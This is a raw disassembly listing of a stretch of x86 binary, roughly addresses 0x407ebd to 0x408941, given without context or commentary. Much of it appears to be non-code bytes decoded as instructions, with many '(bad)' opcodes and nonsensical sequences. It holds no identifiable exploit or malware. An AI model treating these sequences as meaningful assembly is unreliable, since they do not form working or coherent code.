  407ebd:	add    BYTE PTR [ecx],ch
  407ebf:	push   esi
  407ec0:	or     eax,0xd037b00
  407ec5:	add    BYTE PTR [eax],ch
  407ec7:	push   esi
  407ec8:	or     eax,0xd037a00
  407ecd:	add    BYTE PTR [ebx+0x55000d55],ch
  407ed3:	add    al,0xd
  407ed5:	add    BYTE PTR [edx+0x54000d55],ch
  407edb:	add    al,0xd
  407edd:	add    BYTE PTR [ebp+0x37000d55],ch
  407ee3:	add    al,0xd
  407ee5:	add    BYTE PTR [ebp+edx*2+0x436000d],ch
  407eec:	or     eax,0xd55af00
  407ef1:	add    BYTE PTR [ecx],ah
  407ef3:	add    al,0xd
  407ef5:	add    BYTE PTR [esi+0x10000d55],ch
  407efb:	add    al,0xd
  407efd:	add    BYTE PTR [ecx+0x3000d55],dh
  407f03:	add    al,0xd
  407f05:	add    BYTE PTR [eax-0xdfff2ab],ah
  407f0b:	add    ecx,DWORD PTR ds:0xd553300
  407f11:	add    ch,bl
  407f13:	add    ecx,DWORD PTR ds:0xd552200
  407f19:	add    ah,cl
  407f1b:	add    eax,DWORD PTR [eax]
	...
  407f39:	add    BYTE PTR ds:0xd553500,cl
  407f3f:	add    BYTE PTR [edi+0xd03],bh
  407f45:	and    al,0x58
  407f47:	add    BYTE PTR [eax],al
  407f49:	scas   al,BYTE PTR es:[edi]
  407f4a:	push   cs
  407f4b:	add    BYTE PTR [eax],al
  407f4d:	aaa    
  407f4e:	pop    eax
  407f4f:	add    BYTE PTR [eax],al
  407f51:	imul   edx,DWORD PTR [ecx],0x38260000
  407f57:	add    BYTE PTR [eax],al
  407f59:	push   0x19000011
  407f5e:	cmp    BYTE PTR [eax],al
  407f60:	add    BYTE PTR [ebx+0x11],ch
  407f63:	add    BYTE PTR [eax],al
  407f65:	sbb    al,bl
  407f67:	(bad)  
  407f68:	jmp    FWORD PTR [ecx+0x11]
  407f6b:	add    BYTE PTR [eax],al
  407f6d:	mov    ebx,0x64ffffd9
  407f72:	push   cs
  407f73:	add    BYTE PTR [eax],al
  407f75:	mov    edx,0x63ffffb9
  407f7a:	push   cs
  407f7b:	add    BYTE PTR [eax],al
  407f7d:	popf   
  407f7e:	mov    ecx,0xe66ffff
  407f83:	add    BYTE PTR [eax],al
  407f85:	pushf  
  407f86:	fcos   
  407f88:	jmp    DWORD PTR [ebp+0xe]
  407f8b:	add    BYTE PTR [eax],al
  407f8d:	mov    cl,bl
  407f8f:	(bad)  
  407f90:	dec    DWORD PTR [eax+0xe]
  407f93:	add    BYTE PTR [eax],al
  407f95:	mov    edi,DWORD PTR [ecx+0xe47ffff]
  407f9b:	add    BYTE PTR [eax],al
  407f9d:	mov    al,BYTE PTR [eax]
	...
  407fbb:	add    BYTE PTR [ecx+0xe4affff],bh
  407fc1:	add    BYTE PTR [eax],al
  407fc3:	lea    ebx,[ecx+0x0]
  407fc6:	add    BYTE PTR [edx+0xf],cl
  407fc9:	add    BYTE PTR [eax],al
  407fcb:	push   eax
  407fcc:	pop    ecx
  407fcd:	add    BYTE PTR [eax],al
  407fcf:	test   DWORD PTR [esi],ecx
  407fd1:	add    BYTE PTR [eax],al
  407fd3:	inc    ebx
  407fd4:	cmp    DWORD PTR [eax],eax
  407fd6:	add    BYTE PTR [edi+ecx*1+0x3f000000],al
  407fdd:	lods   al,BYTE PTR ds:[esi]
  407fde:	(bad)  
  407fdf:	jmp    FWORD PTR [edi-0x1]
  407fe2:	(bad)  
  407fe3:	dec    DWORD PTR [eax-0x54]
  407fe6:	(bad)  
  407fe7:	dec    DWORD PTR [eax-0x7c000001]
  407fed:	lods   al,BYTE PTR ds:[esi]
  407fee:	(bad)  
  407fef:	jmp    FWORD PTR [ecx-0x1]
  407ff2:	(bad)  
  407ff3:	inc    DWORD PTR [ebx-0x6fffc301]
  407ff9:	xchg   BYTE PTR [eax+0x0],al
  407ffc:	xchg   esi,eax
  407ffd:	inc    BYTE PTR [eax+eax*1]
  408000:	test   al,0x86
  408002:	inc    eax
  408003:	add    cl,dh
  408005:	(bad)  
  408006:	add    BYTE PTR cs:[eax+0x35004086],bh
  40800d:	cld    
  40800e:	add    al,0x0
  408010:	adc    ch,dl
  408012:	aas    
  408013:	add    BYTE PTR [edi+0x680004fb],bh
  408019:	aam    0x3f
  40801b:	add    BYTE PTR [edi+0xdfc],bl
	...
  40803d:	add    BYTE PTR [eax],bh
  40803f:	aam    0x3f
  408041:	add    BYTE PTR [edx-0x4],bh
  408044:	adc    eax,DWORD PTR [eax]
  408046:	adc    ah,0x3f
  408049:	add    BYTE PTR [edx],ah
  40804b:	dec    DWORD PTR [eax]
  40804d:	add    BYTE PTR [esp+edx*8+0x3f],bh
  408051:	add    BYTE PTR [esi-0x1],dl
  408054:	add    eax,0x3fd48400
  408059:	add    BYTE PTR [ebp-0x53fffb05],bh
  40805f:	sar    DWORD PTR [edi],cl
  408061:	add    BYTE PTR [ebx-0x4],bh
  408064:	add    al,BYTE PTR [eax]
  408066:	mov    al,ds:0xfd003fd3
  40806b:	(bad)  
  40806c:	adc    al,BYTE PTR [eax]
  40806e:	xor    al,0xd4
  408070:	aas    
  408071:	add    BYTE PTR ds:0xd0a03b7,cl
  408077:	ins    DWORD PTR es:[edi],dx
  408078:	jl     0x4080ba
  40807a:	or     eax,0xd0603e5
  40807f:	test   DWORD PTR [eax+eax*2+0xd],edi
  408083:	(bad)  
  408084:	add    eax,DWORD PTR [esi]
  408086:	or     eax,0xd407c7d
  40808b:	jl     0x408091
  40808d:	or     DWORD PTR ds:0xd407c81,ecx
  408093:	cmp    eax,0xd90d0403
  408098:	jnp    0x4080da
  40809a:	or     eax,0xd080417
  40809f:	fnstsw WORD PTR [ebx+0x40]
	...
  4080be:	add    BYTE PTR [eax],al
  4080c0:	or     eax,0xd0e03c6
  4080c5:	int    0x7a
  4080c7:	inc    eax
  4080c8:	or     eax,0xd0303ee
  4080cd:	mov    ecx,0xb30d407b
  4080d2:	add    eax,DWORD PTR [ecx*1+0xd407bc1]
  4080d9:	loop   0x4080dd
  4080db:	or     DWORD PTR ds:0xd407bf5,ecx
  4080e1:	jb     0x4080e6
  4080e3:	xor    BYTE PTR ds:0xd407c01,cl
  4080e9:	mov    dl,0x2
  4080eb:	pop    es
  4080ec:	or     eax,0xd407b49
  4080f1:	mov    ebp,0x4d0d0902
  4080f6:	jnp    0x408138
  4080f8:	or     eax,0xd0a02e5
  4080fd:	dec    edi
  4080fe:	jnp    0x408140
  408100:	or     eax,0xd1202e0
  408105:	retf   
  408106:	mov    DWORD PTR [eax+0xd],eax
  408109:	add    BYTE PTR [edx],al
  40810b:	add    al,0x2d
  40810d:	add    BYTE PTR [ecx],bh
  40810f:	mov    cl,BYTE PTR [ebp+0x0]
  408112:	pop    esp
  408113:	add    edx,DWORD PTR [ecx]
  408115:	add    BYTE PTR [ecx],ah
  408117:	mov    cl,BYTE PTR [ebp+0x0]
  40811a:	mov    ebx,0x84ffec03
  40811f:	mov    cl,BYTE PTR [ebp+0x0]
  408122:	inc    ecx
  408123:	add    eax,DWORD PTR [eax]
	...
  408141:	add    bh,bh
  408143:	(bad)  
  408144:	mov    eax,0x90004d8a
  408149:	add    ebp,edi
  40814b:	jmp    FWORD PTR [edx+ecx*4+0x371004d]
  408152:	or     DWORD PTR [eax],eax
  408154:	int    0x8a
  408156:	dec    ebp
  408157:	add    BYTE PTR [edx+0x3],bl
  40815a:	es add cl,cl
  40815d:	mov    cl,ch
  40815f:	push   DWORD PTR [eax-0x26fff5fd]
  408165:	mov    cl,ch
  408167:	dec    eax
  408169:	add    al,0x15
  40816b:	add    ch,ah
  40816d:	mov    ch,cl
  40816f:	jmp    FWORD PTR [edi]
  408171:	add    al,0x10
  408173:	add    ch,cl
  408175:	mov    cl,ch
  408177:	call   FWORD PTR [edi+0x4]
  40817a:	sldt   ecx
  40817d:	mov    cl,ch
  40817f:	(bad)  
  408180:	cmp    al,BYTE PTR [ecx+eiz*1]
  408183:	add    cl,cl
  408185:	mov    cl,ch
  408187:	dec    DWORD PTR [esi+0x4]
  40818a:	cld    
  40818b:	jmp    FWORD PTR [edx+ecx*4+0x4a2ffcd]
  408192:	cld    
  408193:	call   DWORD PTR [eax-0x76]
  408196:	int    0xff
  408198:	mov    ecx,0x39001203
  40819d:	mov    cl,BYTE PTR [ebp+0x0]
  4081a0:	add    cl,ah
  4081a2:	push   cs
  4081a3:	add    al,BYTE PTR [eax]
  4081a5:	dec    ecx
	...
  4081c2:	add    BYTE PTR [eax],al
  4081c4:	xchg   DWORD PTR [edi+0x41140ff],edi
  4081ca:	add    BYTE PTR [ecx-0x69],bh
  4081cd:	mov    edi,0xfc116dff
  4081d2:	jmp    DWORD PTR [eax-0x79]
  4081d5:	mov    edi,0xf90eadff
  4081da:	jmp    FWORD PTR [eax-0x69]
  4081dd:	mov    edi,0x3112bff
  4081e2:	add    BYTE PTR [ecx+0x5effbf84],bh
  4081e8:	adc    DWORD PTR [eax],ecx
  4081ea:	add    BYTE PTR [ebp-0x2000406c],al
  4081f0:	push   cs
  4081f1:	or     BYTE PTR [eax],al
  4081f3:	mov    cl,0x84
  4081f5:	mov    edi,0xf90efcff
  4081fa:	call   FWORD PTR [eax-0x3900406c]
  408200:	push   cs
  408201:	jmp    0x408202
  408203:	mov    al,0x84
  408205:	mov    edi,0x50e73ff
  40820a:	add    BYTE PTR ds:0x80ffbf97,cl
  408210:	push   cs
  408211:	add    eax,0xbf870900
  408216:	jmp    FWORD PTR [ebp+0xe]
  408219:	out    dx,al
  40821a:	(bad)  
  40821b:	in     al,dx
  40821c:	xchg   esp,eax
  40821d:	mov    edi,0x71132ff
  408222:	add    cl,ch
  408224:	test   BYTE PTR [edi+0xc0ff],bh
	...
  408246:	push   cs
  408247:	in     eax,dx
  408248:	dec    DWORD PTR [ebx+ecx*4+0xefdffbf]
  40824f:	or     BYTE PTR [eax],al
  408251:	mov    DWORD PTR [ebx-0x1d000041],ecx
  408257:	add    ecx,DWORD PTR [edi]
  408259:	add    BYTE PTR [esi+eax*4+0x42e0040],ah
  408260:	pop    es
  408261:	add    BYTE PTR [esi+eax*4+0x39c0040],ch
  408268:	or     al,0x0
  40826a:	lods   al,BYTE PTR ds:[esi]
  40826b:	xchg   BYTE PTR [eax+0x0],al
  40826e:	mov    al,ds:0x50000903
  408273:	xchg   BYTE PTR [eax+0x0],al
  408276:	pop    esi
  408277:	add    ecx,DWORD PTR [edx]
  408279:	add    BYTE PTR [esi+eax*4+0x3600040],dl
  408280:	add    al,0x0
  408282:	pop    esp
  408283:	xchg   BYTE PTR [eax+0x0],al
  408286:	inc    ecx
  408287:	add    eax,DWORD PTR [esi+0x1]
  40828a:	xchg   DWORD PTR fs:[eax+0x0],eax
  40828e:	(bad)  
  40828f:	add    dl,BYTE PTR [ebp+0x0]
  408292:	cld    
  408293:	add    DWORD PTR [eax+0x0],0xfffffff0
  408297:	add    ch,BYTE PTR [ecx]
  408299:	add    BYTE PTR [eax],dh
  40829b:	test   BYTE PTR [eax+0x0],al
  40829e:	mov    eax,0x24000a03
  4082a3:	test   BYTE PTR [eax+0x0],al
  4082a6:	call   0x40b5ae
	...
  4082c7:	add    al,dh
  4082c9:	add    BYTE PTR [eax+0x0],0x6d
  4082cd:	add    eax,DWORD PTR [edi]
  4082cf:	add    al,ch
  4082d1:	add    BYTE PTR [eax+0x0],0xc6
  4082d5:	add    ecx,DWORD PTR [ecx]
  4082d7:	add    ah,cl
  4082d9:	add    BYTE PTR [eax+0x0],0xba
  4082dd:	add    ebp,DWORD PTR [eax+eax*1]
  4082e0:	in     al,dx
  4082e1:	add    BYTE PTR [eax+0x0],0x84
  4082e5:	add    al,0xc
  4082e7:	add    BYTE PTR [edx+eax*4],ch
  4082ea:	inc    eax
  4082eb:	add    BYTE PTR ds:0xd440339,cl
  4082f1:	imul   eax,DWORD PTR [edx+0x4840d40],0x82710d04
  4082fb:	inc    eax
  4082fc:	or     eax,0xd040419
  408301:	jns    0x408285
  408303:	inc    eax
  408304:	or     eax,0xd0a03b0
  408309:	adc    eax,0x900d4082
  40830e:	add    eax,DWORD PTR [esi]
  408310:	or     eax,0xd4081ed
  408315:	adc    eax,0x850d2604
  40831a:	add    BYTE PTR [eax+0xd],0x66
  40831e:	add    eax,DWORD PTR ds:0x4081bd0d
  408324:	or     eax,0xd0703de
  408329:	aad    0x81
  40832b:	inc    eax
	...
  408348:	add    BYTE PTR [eax],al
  40834a:	or     eax,0xd03041b
  40834f:	leave  
  408350:	add    DWORD PTR [eax+0xd],0xd1703f3
  408357:	add    DWORD PTR [ecx+0x4230d40],0x81810d0f
  408361:	inc    eax
  408362:	or     eax,0xd0503e9
  408367:	mov    ecx,0xa60d4081
  40836c:	add    edx,DWORD PTR [ecx*1+0xd408221]
  408373:	pop    ebx
  408374:	add    ebx,DWORD PTR [esi]
  408376:	or     eax,0xd4081f1
  40837b:	adc    al,BYTE PTR [edi+eax*1]
  40837e:	or     eax,0xd4081f9
  408383:	add    BYTE PTR [ebx],al
  408385:	add    al,0xfd
  408387:	(bad)  
  408388:	in     al,dx
  408389:	or     ebp,0xb0404ff
  40838f:	add    ch,ah
  408391:	or     DWORD PTR [ebp+0x0],0xe03a4
  408398:	jmp    0x9f40d11e
  40839d:	add    esp,DWORD PTR [edx]
  40839f:	add    BYTE PTR [ecx-0x6effb27c],bl
  4083a5:	add    edi,edx
  4083a7:	jmp    DWORD PTR [eax+0x74004d84]
  4083ad:	add    eax,DWORD PTR [eax]
	...
  4083cb:	add    bh,dh
  4083cd:	jmp    FWORD PTR [esp+eax*4+0x4d]
  4083d1:	add    BYTE PTR [ebx+0x3],dl
  4083d4:	adc    al,BYTE PTR [eax]
  4083d6:	ins    DWORD PTR es:[edi],dx
  4083d7:	test   BYTE PTR [ebp+0x0],cl
  4083da:	mov    al,BYTE PTR [ebx]
  4083dc:	sbb    DWORD PTR [eax],eax
  4083de:	mov    ch,0x84
  4083e0:	dec    ebp
  4083e1:	add    ch,cl
  4083e3:	add    eax,DWORD PTR [edx]
  4083e5:	add    BYTE PTR [ebp-0x15ffb27c],dh
  4083eb:	add    ebp,ecx
  4083ed:	(bad)  
  4083ee:	mov    esp,0xfdffcd84
  4083f3:	add    dl,BYTE PTR [edi]
  4083f5:	add    cl,cl
  4083f7:	test   ch,cl
  4083f9:	call   FWORD PTR [ebx+0x3]
  4083fc:	or     DWORD PTR [eax],eax
  4083fe:	rol    DWORD PTR [ebp+ecx*8+0x90457ff],1
  408405:	add    cl,bh
  408407:	or     ch,0xff
  40840a:	mov    ch,0x4
  40840c:	add    DWORD PTR [eax],eax
  40840e:	jmp    0x18405195
  408413:	add    al,0x1c
  408415:	add    ch,cl
  408417:	test   ch,cl
  408419:	(bad)  
  40841a:	call   FWORD PTR [ebx]
  40841c:	or     esi,edi
  40841e:	dec    DWORD PTR [ecx+edx*4+0x929ffc0]
  408425:	cld    
  408426:	jmp    FWORD PTR [ecx+edx*4+0x912ffc0]
  40842d:	bnd call DWORD PTR [eax+0x0]
	...
  40844d:	add    BYTE PTR [ecx+0x9a0ffbf],dl
  408453:	out    dx,al
  408454:	jmp    DWORD PTR [eax-0x6f]
  408457:	mov    edi,0xf0901ff
  40845c:	add    BYTE PTR ds:0xd8ffbf91,al
  408462:	push   cs
  408463:	idiv   edi
  408465:	ror    BYTE PTR [esi+0xecaffbf],0xfc
  40846c:	jmp    DWORD PTR [eax-0x30004072]
  408472:	push   cs
  408473:	cld    
  408474:	inc    DWORD PTR [eax]
  408476:	xchg   ecx,eax
  408477:	mov    edi,0x50937ff
  40847c:	add    cl,bh
  40847e:	mov    ?,WORD PTR [edi-0xbf6a501]
  408484:	inc    DWORD PTR [eax]
  408486:	xchg   ecx,eax
  408487:	mov    edi,0x40959ff
  40848c:	add    cl,bh
  40848e:	mov    ?,WORD PTR [edi+0x40962ff]
  408494:	add    cl,dh
  408496:	mov    ?,WORD PTR [edi+0x40e9cff]
  40849c:	add    cl,ch
  40849e:	mov    ?,WORD PTR [edi+0x60921ff]
  4084a4:	add    cl,ah
  4084a6:	dec    ecx
  4084a7:	or     al,0x0
  4084a9:	cmp    al,0x9
  4084ab:	cld    
  4084ac:	inc    eax
  4084ae:	pop    ecx
  4084af:	or     al,0x0
	...
  4084cd:	add    BYTE PTR [eax],al
  4084cf:	add    BYTE PTR [esi+0x0],ch
  4084d2:	add    al,0x0
  4084d4:	inc    esp
  4084d5:	cmp    edi,DWORD PTR [edi]
  4084d7:	add    BYTE PTR [ebp+0x74001e00],bh
  4084dd:	cmp    edi,DWORD PTR [edi]
  4084df:	add    BYTE PTR [edx],al
  4084e1:	add    al,0x7
  4084e3:	add    BYTE PTR [ebx+edi*1+0xb0003f],ch
  4084ea:	str    WORD PTR [esp+edi*1+0x3f]
  4084ef:	add    al,bh
  4084f1:	dec    DWORD PTR [edx]
  4084f3:	add    BYTE PTR [eax+0x3c],bl
  4084f6:	aas    
  4084f7:	add    BYTE PTR [edx+0x440008ff],al
  4084fd:	cmp    al,0x3f
  4084ff:	add    ch,dl
  408501:	dec    DWORD PTR [eax+eax*1]
  408504:	fs cmp al,0x3f
  408507:	add    BYTE PTR [ebx-0x1],al
  40850a:	or     DWORD PTR [eax],eax
  40850c:	loopne 0x40854a
  40850e:	aas    
  40850f:	add    BYTE PTR [edi+edi*8+0xc],bl
  408513:	add    al,dl
  408515:	cmp    al,0x3f
  408517:	add    BYTE PTR [esi],bh
  408519:	call   DWORD PTR ds:0x3f3c8800
  40851f:	add    al,ah
  408521:	(bad)  
  408522:	adc    al,0x0
  408524:	sar    BYTE PTR [edi+edi*1],0x0
  408528:	in     al,0xfe
  40852a:	adc    eax,DWORD PTR [eax]
  40852c:	js     0x40856a
  40852e:	aas    
  40852f:	add    BYTE PTR [edi+edi*8+0xe],dl
	...
  408552:	push   0x14003f3c
  408557:	dec    DWORD PTR [ebx]
  408559:	add    BYTE PTR [eax+0x3c],bh
  40855c:	aas    
  40855d:	add    BYTE PTR [edi],ch
  40855f:	add    al,0xb
  408561:	add    BYTE PTR [esi+esi*1],dh
  408564:	aas    
  408565:	add    BYTE PTR ds:0xd0c0483,cl
  40856b:	cmp    edx,ecx
  40856d:	aas    
  40856e:	or     eax,0xd10032c
  408573:	popf   
  408574:	retf   0xd3f
  408577:	retf   0x1303
  40857a:	or     eax,0xd3fc9d1
  40857f:	push   esp
  408580:	add    ecx,DWORD PTR [esi]
  408582:	or     eax,0xd3fc9b1
  408587:	hlt    
  408588:	add    edx,DWORD PTR [ecx]
  40858a:	or     eax,0xd3fc9d5
  40858f:	loopne 0x408594
  408591:	push   cs
  408592:	or     eax,0xd3fc9e5
  408597:	sub    BYTE PTR [ebx],al
  408599:	adc    BYTE PTR ds:0xd3fc949,cl
  40859f:	add    edx,DWORD PTR gs:[ecx]
  4085a2:	or     eax,0xd3fc98d
  4085a7:	addr16 add al,0x15
  4085aa:	or     eax,0xd3fc9a5
  4085af:	add    edx,DWORD PTR [si]
  4085b2:	or     eax,0x3fc9fd
	...
  4085d3:	add    BYTE PTR ds:0xd170390,cl
  4085d9:	xor    eax,0xaa0d3fc9
  4085de:	add    edx,DWORD PTR [edx]
  4085e0:	or     eax,0xd3fc959
  4085e5:	xchg   edi,eax
  4085e6:	add    ebx,DWORD PTR [eax]
  4085e8:	or     eax,0xd3fc905
  4085ed:	mov    dh,0x3
  4085ef:	sbb    DWORD PTR ds:0xd3fc911,ecx
  4085f5:	popa   
  4085f6:	add    esp,DWORD PTR [ebx]
  4085f8:	or     eax,0xd3fc8c5
  4085fd:	add    cl,bl
  4085ff:	add    esi,DWORD PTR [eax]
  408601:	add    BYTE PTR [ebp-0x37],bl
  408604:	adc    al,BYTE PTR [eax]
  408606:	push   ss
  408607:	add    al,0x26
  408609:	add    BYTE PTR [ecx-0x37],cl
  40860c:	add    al,BYTE PTR [eax]
  40860e:	push   ds
  40860f:	add    al,0xe
  408611:	add    BYTE PTR ds:0x40fff2c9,bl
  408617:	add    al,0x12
  408619:	add    BYTE PTR ds:0xc7ffe2c9,dl
  40861f:	add    edx,DWORD PTR [edx]
  408621:	add    BYTE PTR ds:0xffffd2c9,ch
  408627:	add    ebp,DWORD PTR [ecx]
  408629:	add    BYTE PTR [ebp-0x3dffbd38],bh
  40862f:	add    edx,DWORD PTR [edx]
  408631:	add    ch,al
  408633:	enter  0x32,0x51
  408637:	add    eax,DWORD PTR [eax]
	...
  408655:	add    BYTE PTR [edi],dl
  408657:	add    cl,dl
  408659:	enter  0x22,0x12
  40865d:	add    al,0x49
  40865f:	add    BYTE PTR [ecx],dh
  408661:	(bad)  
  408662:	adc    al,BYTE PTR [eax]
  408664:	fiadd  WORD PTR [ebx]
  408666:	out    dx,eax
  408667:	dec    DWORD PTR [eax+0x4e0002c7]
  40866d:	add    ebp,ebx
  40866f:	(bad)  
  408670:	mov    eax,0xb2fff2c7
  408675:	add    edx,DWORD PTR [ecx]
  408677:	add    cl,al
  408679:	(bad)  
  40867a:	loop   0x40867b
  40867c:	iret   
  40867d:	add    edi,esi
  40867f:	push   DWORD PTR [edi+eax*8+0x3f3ffd2]
  408686:	and    DWORD PTR [eax],eax
  408688:	int    0xc7
  40868a:	inc    edx
  40868b:	add    BYTE PTR [esi],cl
  40868d:	add    ebx,DWORD PTR [ebx]
  40868f:	add    ch,bl
  408691:	(bad)  
  408692:	xor    al,BYTE PTR [eax]
  408694:	add    BYTE PTR [edx-0x130014f2],dh
  40869a:	push   eax
  40869b:	or     DWORD PTR [eax],eax
  40869d:	mov    dl,BYTE PTR [ecx]
  40869f:	and    BYTE PTR [eax],al
  4086a1:	rol    DWORD PTR [eax+0x9],0x0
  4086a5:	ss adc ecx,esp
  4086a8:	call   FWORD PTR [eax+0x50]
  4086ab:	or     DWORD PTR [eax],eax
  4086ad:	adc    BYTE PTR [ecx],0x3
  4086b0:	add    BYTE PTR [ebp+0x40],al
  4086b3:	or     DWORD PTR [eax],eax
  4086b5:	adc    dl,BYTE PTR [ecx]
  4086b7:	idiv   bh
  4086b9:	adc    BYTE PTR [eax],al
	...
  4086d7:	add    BYTE PTR [eax+0x9],dl
  4086da:	add    BYTE PTR [ecx+edx*1],dh
  4086dd:	pop    es
  4086de:	add    ch,bh
  4086e0:	inc    ecx
  4086e1:	or     DWORD PTR [eax],eax
  4086e3:	jb     0x4086f6
  4086e5:	sbb    eax,DWORD PTR [eax]
  4086e7:	jge    0x4086bc
  4086e9:	or     BYTE PTR [eax],al
  4086eb:	dec    ebx
  4086ec:	adc    DWORD PTR [ecx],eax
  4086ee:	add    BYTE PTR [ebp+0x7e0008c3],al
  4086f4:	adc    esp,edi
  4086f6:	call   DWORD PTR [ebx+edx*8+0x117b0008]
  4086fd:	cmc    
  4086fe:	push   DWORD PTR [eax]
  408700:	ret    
  408701:	or     BYTE PTR [eax],al
  408703:	js     0x408716
  408705:	cmc    
  408706:	dec    DWORD PTR [ebx+edx*8+0xee30008]
  40870d:	idiv   bh
  40870f:	js     0x4086d4
  408711:	or     BYTE PTR [eax],al
  408713:	inc    edx
  408714:	adc    ebp,esi
  408716:	inc    DWORD PTR [ebx+edx*8+0x111e0008]
  40871d:	cld    
  40871e:	push   DWORD PTR [ebx+eax*8+0x8]
  408722:	add    BYTE PTR [edi+0x11],dh
  408725:	sbb    al,0x0
  408727:	test   DWORD PTR [eax+0x8],edx
  40872a:	add    BYTE PTR [eax],al
  40872c:	pop    ss
  40872d:	add    al,0xb
  40872f:	add    BYTE PTR [edx+edi*1+0x3fb003f],ch
  408736:	adc    BYTE PTR [eax],al
  408738:	test   al,0x3a
  40873a:	aas    
	...
  408757:	add    BYTE PTR [eax],al
  408759:	add    BYTE PTR [esi-0x4],ah
  40875c:	or     al,BYTE PTR [eax]
  40875e:	sub    al,0x3a
  408760:	aas    
  408761:	add    BYTE PTR [ebx+0x40000afc],al
  408767:	cmp    bh,BYTE PTR [edi]
  408769:	add    dl,al
  40876b:	cld    
  40876c:	push   es
  40876d:	add    BYTE PTR [eax],cl
  40876f:	cmp    bh,BYTE PTR [edi]
  408771:	add    BYTE PTR [eax],bl
  408773:	add    al,0x12
  408775:	add    BYTE PTR [edx+edi*1+0x3f],al
  408779:	add    cl,bh
  40877b:	add    esp,DWORD PTR [esi]
  40877d:	add    BYTE PTR [ebp+esi*1+0x3f],bh
  408781:	add    BYTE PTR [edi-0x4],al
  408784:	or     eax,DWORD PTR [eax]
  408786:	mov    esp,0x56003f3a
  40878b:	add    edx,DWORD PTR ds:0x3f3aa400
  408791:	add    BYTE PTR [esi+0x3],dl
  408794:	or     eax,0x3f3a2400
  408799:	add    BYTE PTR [esi+0x3],bl
  40879c:	adc    DWORD PTR [eax],eax
  40879e:	push   eax
  40879f:	cmp    bh,BYTE PTR [edi]
  4087a1:	add    BYTE PTR [ebx],dl
  4087a3:	cld    
  4087a4:	or     al,BYTE PTR [eax]
  4087a6:	inc    esp
  4087a7:	cmp    bh,BYTE PTR [edi]
  4087a9:	add    dl,bh
  4087ab:	add    bl,BYTE PTR [edi]
  4087ad:	add    BYTE PTR [edx+edi*1+0x3f],dh
  4087b1:	add    BYTE PTR [edx-0x37fff6fd],al
  4087b7:	cmp    bh,BYTE PTR [edi]
  4087b9:	add    BYTE PTR [edi+0x303],ah
	...
  4087db:	add    BYTE PTR [edx+edi*1+0x590d003f],al
  4087e2:	add    eax,DWORD PTR [eax]
  4087e4:	or     eax,0xd000359
  4087e9:	or     DWORD PTR [edi],esi
  4087eb:	mov    edx,DWORD PTR [ebp+0x1eda5454]
  4087f1:	ror    DWORD PTR [edi-0x636f6cf],1
  4087f7:	cwde   
  4087f8:	sar    DWORD PTR [edi+0x55ab01dd],0x42
  4087ff:	push   edi
  408800:	cmp    eax,0x15075096
  408805:	adc    esp,DWORD PTR [ebx]
  408807:	sub    ebx,DWORD PTR [eax-0x34]
  40880a:	jmp    0xc84d:0xc46dc6e3
  408811:	ds push edi
  408813:	and    al,0x78
  408815:	sub    ch,BYTE PTR gs:[esi-0x6e]
  408819:	cmp    dh,bl
  40881b:	je     0x40883e
  40881d:	adc    DWORD PTR [ecx],0x1b
  408820:	imul   edx,edi,0x58
  408823:	mov    ds:0x3d87ca28,eax
  408828:	inc    esi
  408829:	push   cs
  40882a:	and    DWORD PTR [eax+esi*1],edx
  40882d:	jp     0x408854
  40882f:	(bad)  
  408830:	jb     0x4087d7
  408832:	mov    esi,0xa8a8fdf2
  408837:	mov    ?,WORD PTR [edi+0x40dcd981]
  40883d:	loop   0x408808
  40883f:	jmp    0x408841
	...
  40885d:	add    BYTE PTR [esi],ah
  40885f:	dec    eax
  408860:	adc    eax,DWORD PTR [edi]
  408862:	sub    cl,dh
  408864:	dec    eax
  408865:	xchg   BYTE PTR [eax+edi*2+0x5c836020],al
  40886c:	sbb    BYTE PTR [esi],cl
  40886e:	neg    BYTE PTR [eax+0x40]
  408871:	xlat   BYTE PTR ds:[ebx]
  408872:	shl    DWORD PTR ds:0x4841d1,1
  408878:	nop
  408879:	cmp    dl,BYTE PTR [ebp-0x40]
  40887c:	call   0x61871364
  408881:	add    eax,0x13e5000d
  408886:	or     DWORD PTR [eax],edx
  408888:	fst    QWORD PTR [ebx]
  40888a:	adc    DWORD PTR [eax],edx
  40888c:	lds    edx,FWORD PTR [ebx]
  40888e:	cmp    DWORD PTR [edx+0x30],edx
  408891:	inc    eax
  408892:	call   0xa27333c3
  408897:	inc    dx
  408899:	xor    BYTE PTR [ecx-0x4175bc6d],dl
  40889f:	inc    ebx
  4088a0:	hlt    
  4088a1:	mov    dh,0xc9
  4088a3:	test   DWORD PTR [esi],eax
  4088a5:	jl     0x4088ca
  4088a7:	fisttp WORD PTR [ebx-0x7af06eed]
  4088ad:	adc    edi,DWORD PTR [ecx+0xf]
  4088b0:	jge    0x4088c5
  4088b2:	popa   
  4088b3:	shld   DWORD PTR [ebx],edx,cl
  4088b6:	dec    ecx
  4088b7:	bsr    edx,DWORD PTR [ebx]
  4088ba:	xor    DWORD PTR [edi],ecx
  4088bc:	retf   0x6cff
  4088bf:	test   al,0x5b
  4088c1:	push   ecx
	...
  4088de:	add    BYTE PTR [eax],al
  4088e0:	sbb    edx,edx
  4088e2:	aas    
  4088e3:	and    al,0x15
  4088e5:	inc    ebp
  4088e6:	push   ebp
  4088e7:	sbb    ah,dl
  4088e9:	or     eax,ebx
  4088eb:	mov    es,WORD PTR [eax-0x3e]
  4088ee:	pop    edi
  4088ef:	push   0x29
  4088f1:	sar    BYTE PTR [ecx+eiz*8],1
  4088f4:	inc    esi
  4088f5:	bsr    edx,DWORD PTR [ecx+esi*1]
  4088f9:	pextrw edx,(bad),0xc5
  4088fb:	adc    al,0x39
  4088fd:	paddusw mm2,QWORD PTR [ecx+eax*2]
  408901:	pcmpgtw mm2,QWORD PTR [ecx+ecx*4]
  408905:	minps  xmm2,XMMWORD PTR [edx+0x15]
  408909:	dec    esi
  40890a:	jae    0x408909
  40890c:	nop
  40890d:	xchg   ebp,eax
  40890e:	add    BYTE PTR [ecx-0x75],dh
  408911:	mov    ebp,0xcfba1fd4
  408916:	inc    edi
  408917:	ror    DWORD PTR [ebp+0x5afee143],0x43
  40891e:	loopne 0x408939
  408920:	push   ss
  408921:	mov    DWORD PTR [ecx],esi
  408923:	in     eax,0x1c
  408925:	hlt    
  408926:	xor    ebp,ebx
  408928:	sbb    al,0xe4
  40892a:	xor    ebp,eax
  40892c:	cld    
  40892d:	adc    esi,DWORD PTR [edx]
  40892f:	mov    ebp,0xa53203fc
  408934:	cld    
  408935:	je     0x4088d5
  408937:	lock popa 
  408939:	shl    esi,1
  40893b:	out    0x28,eax
  40893d:	sti    
  40893e:	addr16 adc al,0x9d
  408941:	out    0xd1,eax
